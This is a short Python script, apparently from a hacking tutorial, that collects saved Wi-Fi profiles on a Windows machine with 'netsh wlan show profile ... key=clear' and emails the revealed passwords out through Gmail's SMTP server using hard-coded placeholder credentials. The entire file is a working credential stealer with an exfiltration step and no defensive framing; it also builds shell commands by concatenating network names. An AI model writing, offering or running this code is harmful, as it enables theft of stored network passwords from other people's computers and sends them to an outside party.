#!/usr/bin/env python

import subprocess, smtplib, re

# Function to send email
def send_mail(email_addr, passwd, msg):
    # Establish a connection with the SMTP server
    server = smtplib.SMTP("smtp.gmail.com", 587)
    # Start TLS encryption
    server.starttls()
    # Login to the email server
    server.login(email_addr, passwd)
    # Send the email
    server.sendmail(email_addr, email_addr, msg)
    # Quit the SMTP server
    server.quit()

# Get list of Wi-Fi networks stored on the system
command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
# Extract network names from the output
networks_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)

result = ""
# Iterate over each network name
for network_name in networks_names_list:
    # Get detailed information about the network
    command = "netsh wlan show profile " + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True)
    # Append the result to the overall result string
    result = result + current_result

# Send the collected Wi-Fi network information via email
send_mail(".....@gmail.com", "1234567", result)

